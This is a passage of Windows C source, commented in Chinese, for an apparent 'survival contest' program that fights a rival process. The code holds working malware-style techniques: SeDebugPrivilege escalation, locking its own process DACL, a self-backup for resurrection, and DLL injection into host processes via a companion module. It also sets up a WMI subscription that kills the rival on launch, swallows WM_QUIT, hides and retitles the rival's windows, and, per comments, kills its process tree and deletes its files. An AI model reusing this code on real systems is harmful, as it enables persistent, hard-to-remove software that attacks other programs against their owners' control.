                hr = pServices->lpVtbl->PutInstance(pServices, pYyBind, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put binding 0x%08X", hr); break; }
                WriteLog(L"WMI(yywatch) created: yy.exe 一创建就被 taskkill");
            } while (0);

            if (pYyBind) pYyBind->lpVtbl->Release(pYyBind);
            if (pYyFilter) pYyFilter->lpVtbl->Release(pYyFilter);
            if (pYyConsumer) pYyConsumer->lpVtbl->Release(pYyConsumer);
        }
    }

cleanup:
    if (pBindingInstance) pBindingInstance->lpVtbl->Release(pBindingInstance);
    if (pBindingClass) pBindingClass->lpVtbl->Release(pBindingClass);
    if (pConsumerInstance) pConsumerInstance->lpVtbl->Release(pConsumerInstance);
    if (pConsumerClass) pConsumerClass->lpVtbl->Release(pConsumerClass);
    if (pFilterInstance) pFilterInstance->lpVtbl->Release(pFilterInstance);
    if (pFilterClass) pFilterClass->lpVtbl->Release(pFilterClass);
    if (pEnum) pEnum->lpVtbl->Release(pEnum);
    if (pServices) pServices->lpVtbl->Release(pServices);
    if (pLocator) pLocator->lpVtbl->Release(pLocator);
    CoUninitialize();
    return bRet;
}

/* ================== 自保：持续维护 xx.exe 备份 ==================
   对手会结束 xx.exe 并删除磁盘文件；这里持续维护 <dir>\xxres.bin，
   复活方(svcguard.dll / window.dll)在 xx.exe 缺失时用它还原。 */
#define XX_BACKUP_NAME XX_BACKUP_NAME_W

static void GetSelfDir(WCHAR *dir, SIZE_T cch)
{
    GetModuleFileNameW(NULL, dir, (DWORD)cch);
    WCHAR *p = wcsrchr(dir, L'\\');
    if (p) p[1] = L'\0';
}

static DWORD WINAPI SelfProtectThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    WCHAR dir[MAX_PATH], self[MAX_PATH], bak[MAX_PATH];
    GetSelfDir(dir, MAX_PATH);
    swprintf_s(bak, MAX_PATH, L"%s" XX_BACKUP_NAME, dir);
    for (;;) {
        if (GetFileAttributesW(bak) == INVALID_FILE_ATTRIBUTES) {
            GetModuleFileNameW(NULL, self, MAX_PATH);
            if (CopyFileW(self, bak, FALSE))
                WriteLog(L"self backup written: %s", bak);
        }
        Sleep(1000);
    }
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ==================
   跨进程打开句柄做注入/击杀时标准用户权限不够，尤其跨会话与系统进程。 */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* ================== deferred init + DLL load thread ================== */
static DWORD WINAPI InitThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);

    if (!EnableDebugPrivilege())
        WriteLog(L"SeDebugPrivilege enable failed: %lu", GetLastError());
    else
        WriteLog(L"SeDebugPrivilege enabled");

    /* 必须在收紧 DACL 之前打开自己的进程句柄：之后 xx 的 DACL 把 Everyone
       全拒，连自己都打不开。该句柄随后写进共享内存，由 svcguard 复制给宿主
       里的 guard.dll（见 xxipc.h 的 OFFSET_SELF_HANDLE）。 */
    g_hSelfHandle = OpenProcess(XX_SHARED_HANDLE_ACCESS, FALSE, GetCurrentProcessId());
    WriteLog(L"self handle: %s", g_hSelfHandle ? L"OK" : L"failed");

    /* 会话号也必须在收紧 DACL 之前取：ProcessIdToSessionId 内部要打开自身进程，
       DACL 一锁（又没有 SeDebugPrivilege 绕过）就会失败并返回 0 —— 之前日志里
       那句 "session id: 0" 就是这么来的，XX_SESSION 于是永远没写进去。 */
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &g_dwOwnSession))
        g_dwOwnSession = 0;
    WriteLog(L"own session: %lu", g_dwOwnSession);

    if (!InitSecurityDescriptor())
        WriteLog(L"Security descriptor failed");
    else
        WriteLog(L"Security descriptor OK");

    if (!InitSharedMemory()) {
        /* 建不出映射（例如没有 SeCreateGlobalPrivilege）也继续跑下去：
           至少把 window.dll 拉起来抢弹窗锁，不要在这里整体放弃。 */
        WriteLog(L"Shared memory failed, continue without IPC");
    } else {
        WriteLog(L"Shared memory OK");
        XX_SELF_HANDLE(g_pSharedView) = (ULONGLONG)(ULONG_PTR)g_hSelfHandle;
        XX_SESSION(g_pSharedView) = (LONG)g_dwOwnSession;
        {
            /* ① 自身全路径：注入的 dll 是从 %TEMP% 的改名副本加载的，必须靠这个
                  字段才能找到真正的程序目录（xx.exe/xxres.bin/同伴 dll/xpt.xpt）。
               ② 共享 salt：映射**已经存在**（还有别的实例活着）就沿用旧值，不能重新随机 ——
                  否则各实例算出的临时副本名/回退锁名会不一致。
               ③ 会话随机名 token：**不写共享内存**，只在注入/加载时用 XxSetNames 推给各模块
                  （方案 A：远程调用，读完由注入方清零释放）。 */
            WCHAR self[MAX_PATH] = L"";
            if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
                if (wcslen(self) < XX_PATH_MAX) {
                    wcsncpy_s(XX_XXPATH(g_pSharedView), XX_PATH_MAX, self, _TRUNCATE);
                    WriteLog(L"xx path: %s", self);
                } else {
                    /* 放不下就宁可不写：写进去的截断路径会让注入副本推错目录，
                       留空各模块会退回自己的模块路径（至少 xx.exe 本体是对的）。 */
                    XX_XXPATH(g_pSharedView)[0] = L'\0';
                    WriteLog(L"xx path 太长（%u 字符 > %d），不写入共享内存", (unsigned)wcslen(self), XX_PATH_MAX - 1);
                }
            }
            if (g_bFreshMapping || XX_TMP_SALT(g_pSharedView) == 0) {
                srand(GetTickCount() ^ (GetCurrentProcessId() << 4));
                XX_TMP_SALT(g_pSharedView) = (((DWORD)rand() << 16) ^ (DWORD)rand()) | 1u;
                WriteLog(L"shared salt: NEW（值不落日志：共享内存里本来就有，日志不该再多一份副本）");
            } else {
                WriteLog(L"shared salt: REUSE（沿用旧值）");
            }
            /* 共享内存里的 64 位**回退** token：映射已存在就沿用（xx 重启不换名），
               否则用 RtlGenRandom 新生成。它是"拿不到秘密 token 的实例"之间的共同值，
               所以可被能解析我们映射的对手读到 —— 真正的秘密 token 在下面、不写共享内存。 */
            if (g_bFreshMapping || XX_NAME_TOKEN64(g_pSharedView) == 0) {
                XX_NAME_TOKEN64(g_pSharedView) = MakeNameToken();
                WriteLog(L"fallback token64: NEW（不落日志）");
            } else {
                WriteLog(L"fallback token64: REUSE（沿用旧值）");
            }
            /* 真正的秘密 token：64 位、RtlGenRandom 生成、**不写共享内存**，
               只经 XxSetNames 推给各模块（参数块读完清零）。 */
            g_dwNameToken = MakeNameToken();
            WriteLog(L"name token: 64-bit generated（值不落任何日志/文件/共享内存）");
        }
    }

    if (!CreateHeartbeatSuffix()) {
        WriteLog(L"Heartbeat suffix failed, continue");
    } else {
        WriteLog(L"Heartbeat suffix: %s", g_szHeartbeatSuffix);
    }

    WriteLog(L"Loading svcguard.dll...");
    HMODULE hDeamon = LoadLibraryW(L"svcguard.dll");
    PushNamesToModule(hDeamon);   /* 方案 A：把会话随机名推给 svcguard */
    if (hDeamon) {
        WriteLog(L"svcguard.dll loaded");
        typedef void (WINAPI *DeamonInit_t)(void);
        DeamonInit_t pInit = (DeamonInit_t)GetProcAddress(hDeamon, "DeamonInit");
        if (pInit) {
            pInit();
            WriteLog(L"DeamonInit called");
        } else {
            WriteLog(L"DeamonInit not found");
        }
    } else {
        WriteLog(L"svcguard.dll failed: %lu", GetLastError());
    }

    /* window.dll 必须在慢速初始化（WMI 订阅）之前加载：
       弹窗出现得越早、抢到 Local\xx_wg_<token> 越早，8 秒红线越安全。 */
    WriteLog(L"Loading window.dll...");
    HMODULE hWin = LoadLibraryW(L"window.dll");
    PushNamesToModule(hWin);
    if (hWin) {
        WriteLog(L"window.dll loaded");
    } else {
        WriteLog(L"window.dll failed: %lu", GetLastError());
    }

    RegisterSelfToXpt();

    /* guard.dll 不再由 xx.exe 加载：xx 被结束时它会一起死，无法完成"复活 xx"。
       改由 svcguard.dll 注入宿主进程，并把 xx 自己的进程句柄一并复制进去
       （共享内存登记），从而绕开 xx 的进程 DACL。 */
    WriteLog(L"guard.dll: 交由 svcguard 注入宿主进程（不在 xx 内加载）");

    SetupWMISubscription();

    /* defense.dll：动态导入 StartDefense，在新线程运行（避免 Hook 影响 xx 主流程） */
    WriteLog(L"Loading defense.dll...");
    HMODULE hDef = LoadLibraryW(L"defense.dll");
    PushNamesToModule(hDef);
    if (hDef) {
        typedef void (WINAPI *StartDefense_t)(void);
        StartDefense_t pDef = (StartDefense_t)GetProcAddress(hDef, "StartDefense");
        if (pDef) {
            HANDLE hDefThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pDef, NULL, 0, NULL);
            if (hDefThread) CloseHandle(hDefThread);
            WriteLog(L"defense.dll StartDefense started");
        } else {
            WriteLog(L"defense StartDefense not found");
        }
    } else {
        WriteLog(L"defense.dll failed: %lu", GetLastError());
    }

    return 0;
}

/* ================== 对 yy 窗口的利用（依据 yybad.md 第一章，DDoS 项不做） ==================
   1.1 WM_DESTROY/DestroyWindow：yy 的 WndProc 里 `if (msg==WM_DESTROY) return 0;` 是白写，
       但**跨进程 DestroyWindow 也必然失败**（只有创建窗口的那个线程能销毁它），
       所以真正让它"消失"的是 1.3 + 1.5：隐藏 + 挂到不可见父窗口。
       yy 主循环只查 `!g_hMainWnd || !IsWindow(g_hMainWnd)`，隐藏后窗口依然"存在"
       → 它永远不会重建 → 8 秒后判负。这里仍尝试一次 DestroyWindow 并把结果写日志。
   1.2 WM_SETTEXT 未被拦截 → 走系统消息编组把标题改成我方窗口名（跨进程安全）。
   1.3 SetParent 到我们自己建的不可见窗口 → 即使 yy 自己再 ShowWindow 也看不见。
   1.5 其它未处理消息：SC_MINIMIZE / WM_ENABLE(FALSE)。
   1.6 日志框是标准 EDIT：用 WM_GETTEXT + WM_SETTEXT 追加嘲讽 / 整段清空。
       注意**不能用 EM_REPLACESEL**：它带字符串指针，跨进程不会被编组，目标会读到野指针
       （yybad.md 里那段代码是错的，会直接把 yy 搞崩或读到乱码）；WM_SETTEXT / WM_GETTEXT
       是窗口管理器会代为编组的消息，才是跨进程唯一安全的写法。 */
static HWND  g_hHiddenParent = NULL;
static DWORD g_dwLastTaunt = 0;
static int   g_nTauntIdx = 0;
static BOOL  g_bDestroyTried = FALSE;

static const WCHAR *g_taunts[] = {
    L"[xx] yy.exe is just a waste\r\n",
    L"[xx] your log is mine now\r\n",
    L"[xx] xx_ALIVE_WND > YY_Defensive_GUI\r\n",
    L"[xx] ni de tanchuang yi jing gui wo le\r\n"
};

static void TauntEnemyLog(HWND hEnemy)
{
    HWND hLog;
    WCHAR buf[2048];
    DWORD now = GetTickCount();
    int len;

    if (!hEnemy) return;
    if (now - g_dwLastTaunt < XX_WASTE_MS) return;   /* 与 waste 一致：2 秒一条 */
    g_dwLastTaunt = now;

    hLog = FindWindowExW(hEnemy, NULL, L"EDIT", NULL);   /* yy 的日志框 */
    if (!hLog) return;

    len = (int)SendMessageW(hLog, WM_GETTEXTLENGTH, 0, 0);
    if (len < 0) len = 0;
    if (len > (int)_countof(buf) - 160) len = (int)_countof(buf) - 160;
    if (len > 0) SendMessageW(hLog, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)buf);
    else buf[0] = L'\0';
    buf[len] = L'\0';

    if ((g_nTauntIdx % 5) == 0)
        wcscpy_s(buf, _countof(buf), g_taunts[0]);        /* 每 5 次整段清空重写 */
    else
        wcsncat_s(buf, _countof(buf), g_taunts[g_nTauntIdx % 4], _TRUNCATE);

    SendMessageW(hLog, WM_SETTEXT, 0, (LPARAM)buf);
    g_nTauntIdx++;
}

/* 这个窗口是不是**我们自己**的弹窗？
   注意绝不能用"该进程里有没有我们的 window 模块"来判断 —— 我们会把 window.dll
   注入进 yy 的子进程（蜜罐 lenovo_fix.exe 之类），那样它的窗口会被误判成我方窗口
   直接跳过，结果它的标题一直没人动（实测就是这么漏的）。
   可靠的判据只有两条：① 类名符合我方格式 `wnd_<16 位十六进制>`；
   ② 共享内存的弹窗持有者表里登记的正是这个句柄。 */
static BOOL GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch)
{
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    DWORD n = cch;
    BOOL ok = FALSE;
    if (h) {
        ok = QueryFullProcessImageNameW(h, 0, path, &n) ? TRUE : FALSE;
        CloseHandle(h);
    }
    if (!ok && cch) path[0] = L'\0';
    return ok;
}
static BOOL IsOurPopupClass(const WCHAR *cls)
{
    int i;
    if (!cls) return FALSE;
    if (wcsncmp(cls, L"wnd_", 4) != 0) return FALSE;
    if (wcslen(cls) != 20) return FALSE;
    for (i = 4; i < 20; i++) {
        WCHAR c = cls[i];
        if (!((c >= L'0' && c <= L'9') || (c >= L'a' && c <= L'f'))) return FALSE;
    }
    return TRUE;
}

static BOOL IsOurOwnPopupWindow(HWND hWnd, const WCHAR *cls)
{
    HANDLE hMap;
    PVOID view;
    int i;

    if (IsOurPopupClass(cls)) return TRUE;

    hMap = XXOpenShared();
    if (!hMap) return FALSE;
    view = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
    if (!view) { CloseHandle(hMap); return FALSE; }
    for (i = 0; i < OWNER_SLOTS; i++) {
        if ((HWND)(ULONG_PTR)XX_SLOT_HWND(view, i) == hWnd) {
            UnmapViewOfFile(view);
            CloseHandle(hMap);
            return TRUE;
        }
    }
    UnmapViewOfFile(view);
    CloseHandle(hMap);
    return FALSE;
}

/* ================== 模仿用户的 waste：每 2 秒给 yy 主进程一条嘲讽 ==================
   waste.c 的做法：每轮**重新 FindWindow**（句柄会变）、标题改成 `xx_ALIVE_WND`、
   往日志框追加一条带时间戳的 "yy.exe is just a waste"。
   这里照抄这个节奏（2 秒一条），但用系统会跨进程编组的 WM_GETTEXT/WM_SETTEXT 写入，
   并且**枚举**而不是 FindWindow（lenovo 与 yy 类名相同，FindWindow 只拿到第一个）。 */

static HWND FindYyMainWindowForWaste(void)
{
    HWND h = GetTopWindow(NULL);
    HWND fallback = NULL;
    while (h) {
        if (IsWindow(h) && IsWindowVisible(h)) {
            WCHAR cls[128] = L"", title[192] = L"", leaf[MAX_PATH] = L"";
            DWORD pid = 0;
            GetClassNameW(h, cls, _countof(cls));
            GetWindowTextW(h, title, _countof(title));
            GetWindowThreadProcessId(h, &pid);
            if (cls[0] && (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0)) {
                const WCHAR *base = L"";
                WCHAR path[MAX_PATH] = L"";
                if (pid && GetProcessPathByPid(pid, path, MAX_PATH)) {
                    base = wcsrchr(path, L'\\');
                    base = base ? base + 1 : path;
                }
                wcsncpy_s(leaf, MAX_PATH, base, _TRUNCATE);
                if (_wcsicmp(leaf, L"yy.exe") == 0 || _wcsicmp(leaf, L"ww.exe") == 0)
                    return h;            /* 主进程优先 */
                if (!fallback) fallback = h;
            }
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return fallback;
}

static void WasteOneShot(void)
{
    HWND h = FindYyMainWindowForWaste();
    HWND hLog;
    WCHAR buf[2048];
    WCHAR line[160];
    SYSTEMTIME st;
    int len;

    if (!h) return;
    SetWindowTextW(h, L"xx_ALIVE_WND");            /* 与 waste.c 完全一致的标题 */
    hLog = FindWindowExW(h, NULL, L"EDIT", NULL);
    if (!hLog) return;

    GetLocalTime(&st);
    _snwprintf(line, _countof(line) - 1,
               L"[%02d-%02d-%02d] System Shield Active. yy.exe is just a waste.\r\n",
               st.wDay, st.wMonth, st.wSecond);
    line[_countof(line) - 1] = L'\0';

    len = (int)SendMessageW(hLog, WM_GETTEXTLENGTH, 0, 0);
    if (len < 0) len = 0;
    if (len > (int)_countof(buf) - 160) len = (int)_countof(buf) - 160;
    if (len > 0) SendMessageW(hLog, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)buf);
    else buf[0] = L'\0';
    buf[len] = L'\0';
    wcsncat_s(buf, _countof(buf), line, _TRUNCATE);
    SendMessageW(hLog, WM_SETTEXT, 0, (LPARAM)buf);
}

static DWORD WINAPI WasteMimicThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    for (;;) {
        WasteOneShot();
        Sleep(XX_WASTE_MS);
    }
    return 0;
}

static void StartWasteMimic(void)
{
    static LONG s_bStarted = 0;
    if (InterlockedCompareExchange(&s_bStarted, 1, 0) == 0) {
        HANDLE h = CreateThread(NULL, 0, WasteMimicThread, NULL, 0, NULL);
        if (h) CloseHandle(h);
        WriteLog(L"waste 模仿线程已启动（每 2 秒给 yy 主进程一条嘲讽）");
    }
}

/* yy 本体：只嘲讽不压制。新规则是先连发 10 条嘲讽，之后由 atkcore 结束它的进程树；
   一旦我们隐藏/挂父窗口/最小化，嘲讽就没人看得见了（标题用 waste.c 的同款写法）。 */
static void TauntEnemyWindowOnly(HWND hWnd)
{
    if (!hWnd || !IsWindow(hWnd)) return;
    SetWindowTextW(hWnd, L"xx_ALIVE_WND");
    TauntEnemyLog(hWnd);
}
static void AttackEnemyWindow(HWND hWnd, const WCHAR *ownSuffix)
{
    WCHAR spoof[128];

    if (!hWnd || !IsWindow(hWnd)) return;

    /* 1.2 改标题（伪装成我方窗口） */
    if (ownSuffix && ownSuffix[0])
        _snwprintf(spoof, _countof(spoof), L"xx_ALIVE_WND_%s", ownSuffix);
    else
        wcscpy_s(spoof, _countof(spoof), L"xx_ALIVE_WND");
    spoof[_countof(spoof) - 1] = L'\0';
    SetWindowTextW(hWnd, spoof);

    /* 1.5 未拦的消息：最小化 + 禁用 */
    PostMessageW(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
    PostMessageW(hWnd, WM_ENABLE, FALSE, 0);

    /* 1.3 挂到不可见父窗口（先建一个），再隐藏 */
    if (!g_hHiddenParent) {
        g_hHiddenParent = CreateWindowExW(0, L"STATIC", L"", 0,
                                          0, 0, 0, 0, NULL, NULL,
                                          GetModuleHandleW(NULL), NULL);
    }
    if (g_hHiddenParent) SetParent(hWnd, g_hHiddenParent);
    ShowWindow(hWnd, SW_HIDE);

    /* 1.1 试一次 DestroyWindow，仅记录结果（跨进程必然失败） */
    if (!g_bDestroyTried) {
        g_bDestroyTried = TRUE;
        if (DestroyWindow(hWnd)) WriteLog(L"DestroyWindow(yy 窗口) 成功");
        else WriteLog(L"DestroyWindow(yy 窗口) 失败（跨进程限制）-> 已改用隐藏+挂不可见父窗口");
    }

    /* 1.6 日志嘲讽 */
    TauntEnemyLog(hWnd);
}

/* ================== 攻击线程（保持不变，已稳定） ================== */
static DWORD WINAPI AttackThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    WriteLog(L"Attack thread starting...");

    WCHAR ownSuffix[MAX_WND_SUFFIX] = { 0 };
    HANDLE hMap = OpenFileMappingW(FILE_MAP_READ, FALSE, SHARED_MEM_NAME);
    if (hMap) {
        void *pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
        if (pView) {
            WCHAR *pSuffix = (WCHAR *)((BYTE *)pView + OFFSET_WND_SUFFIX);
            wcsncpy_s(ownSuffix, MAX_WND_SUFFIX, pSuffix, _TRUNCATE);
            UnmapViewOfFile(pView);
        }
        CloseHandle(hMap);
    }

    HMODULE hKill = LoadLibraryW(L"atkcore.dll");
    PushNamesToModule(hKill);
    if (hKill) {
        typedef void (WINAPI *StartAttack_t)(void);
        StartAttack_t pStart = (StartAttack_t)GetProcAddress(hKill, "StartAttack");
        if (pStart) {
            pStart();
            WriteLog(L"atkcore.dll StartAttack called");
        }
    }

    WriteLog(L"Window spoofing active");
    StartWasteMimic();      /* 模仿 waste.c：每 2 秒给 yy 主进程一条嘲讽 */

    while (1) {
        HWND hWnd = GetTopWindow(NULL);
        while (hWnd) {
            if (!IsWindow(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }
            if (!IsWindowVisible(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            WCHAR cls[128] = { 0 };
            GetClassNameW(hWnd, cls, _countof(cls));

            DWORD pid = 0;
            GetWindowThreadProcessId(hWnd, &pid);
            if (pid == 0) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            /* 别打自己人的窗口。**不能**用"该进程里有我们的 window 模块"判断：
               我们会把 window.dll 注入进 yy 的子进程（蜜罐 lenovo_fix.exe），
               那样它的窗口会被误判成我方窗口直接跳过 —— 实测它的标题一直没人动就是这么来的。
               改成：类名符合我方格式 `wnd_<16hex>`，或这个句柄正登记在弹窗持有者表里。 */
            if (pid == GetCurrentProcessId() || IsOurOwnPopupWindow(hWnd, cls)) {
                hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
                continue;
            }

            BOOL bTarget = FALSE;
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProc) {
                WCHAR path[MAX_PATH];
                DWORD size = MAX_PATH;
                if (QueryFullProcessImageNameW(hProc, 0, path, &size)) {
                    WCHAR *pName = wcsrchr(path, L'\\');
                    if (pName) pName++; else pName = path;
                    if (_wcsicmp(pName, L"yy.exe") == 0 || _wcsicmp(pName, L"ww.exe") == 0)
                        bTarget = TRUE;
                }
                CloseHandle(hProc);
            }
            WCHAR enemyCls[128], enemyTitle[256];
            wcscpy_s(enemyCls, _countof(enemyCls), cls);
            GetWindowTextW(hWnd, enemyTitle, _countof(enemyTitle));

            /* 新规则：
               **本体（yy.exe/ww.exe）只嘲讽、不压制** —— atkcore 的 waste 模仿线程要往它的
               日志框里连发 10 条嘲讽，一旦我们隐藏/挂到不可见父窗口/最小化，嘲讽就没人看得见；
               10 条发完后由 atkcore 结束它的进程树并锁死删除源文件。
               **子进程（蜜罐 lenovo_fix.exe 等）**照常压制（改标题/隐藏/挂父窗口/最小化），
               因为它们接下来会被直接杀掉+锁死+删除，死之前也别让它发出存活证明。 */
            if (bTarget) {
                TauntEnemyWindowOnly(hWnd);
            } else {
                WriteLog(L"压制 yy 子进程窗口 PID=%lu（该进程随后被杀掉+锁死+删除源文件）", pid);
                AttackEnemyWindow(hWnd, ownSuffix);
            }

            if (!IsWindow(hWnd)) {
                /* 窗口真被销毁了（或对手自己退出了）：用它的类名/标题占位建一个假窗口，
                   让只按"窗口存在"判定的观察者看到 yy 的窗口还在 */
                WNDCLASSW wc = { 0 };
                wc.lpfnWndProc = DefWindowProcW;
                wc.hInstance = GetModuleHandleW(NULL);
                wc.lpszClassName = enemyCls;
                RegisterClassW(&wc);
                CreateWindowExW(0, enemyCls, enemyTitle, WS_POPUP,
                                0, 0, 1, 1, NULL, NULL, wc.hInstance, NULL);
            }

            hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
        }
        /* 降低 xx.exe 自身窗口扫描频率：攻击负荷在被注入的副本里，这里 300ms 足够 */
        Sleep(300);
    }
    return 0;
}
/* ================== 主入口 ================== */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);

    /* 触发一次真实 TLS 访问：MinGW ld 只有看到存活的 TLS 引用才会
       生成 TLS Directory，否则 .CRT$XLB 里的 EarlyPayload 永不触发。 */
#if defined(__GNUC__)
    (void)g_tlsTicket;
#endif

    InitializeCriticalSection(&g_csLog);

    /* Step 1: start attack immediately */
    HANDLE hAttackThread = CreateThread(NULL, 0, AttackThread, NULL, 0, NULL);
    if (hAttackThread) {
        CloseHandle(hAttackThread);
        WriteLog(L"Attack thread started first");
    }

    /* Step 2: background init + DLL spread */
    HANDLE hInitThread = CreateThread(NULL, 0, InitThread, NULL, 0, NULL);
    if (hInitThread) {
        CloseHandle(hInitThread);
        WriteLog(L"Init thread started");
    }

    /* Step 3: self-protection (maintain xx.exe backup) */
    HANDLE hSelfThread = CreateThread(NULL, 0, SelfProtectThread, NULL, 0, NULL);
    if (hSelfThread) {
        CloseHandle(hSelfThread);
        WriteLog(L"Self-protect thread started");
    }

    WriteLog(L"Entering message loop");

    /* message loop + periodic alive log */
    DWORD dwLastTick = GetTickCount();
    MSG msg;

    while (1) {
        // 处理消息
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            /* 外部 PostThreadMessage(WM_QUIT) 会让 PeekMessage 直接返回 WM_QUIT，
               一条消息就能让 xx 退出并触发复活/共享内存连锁，故直接吞掉
               （与 window.dll 消息循环同一策略）。 */
            if (msg.message == WM_QUIT) {
                WriteLog(L"ignored external WM_QUIT");
                continue;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        // 定期写入存活日志
        if (GetTickCount() - dwLastTick > 5000) {
            WriteLog(L"XX alive, PID: %lu", GetCurrentProcessId());
            dwLastTick = GetTickCount();
        }
        Sleep(1000);
    }

    /* 循环不会自行退出：xx.exe 只能被外部结束（这是存活竞赛的要求）。
       以下收尾代码保留，仅在被编译器优化掉的极端路径下才可能到达。 */
    DeleteCriticalSection(&g_csLog);
    if (g_pSharedView) UnmapViewOfFile(g_pSharedView);
    if (g_hSharedMem) CloseHandle(g_hSharedMem);
    if (g_hHeartbeatEvent) CloseHandle(g_hHeartbeatEvent);
    return 0;
}
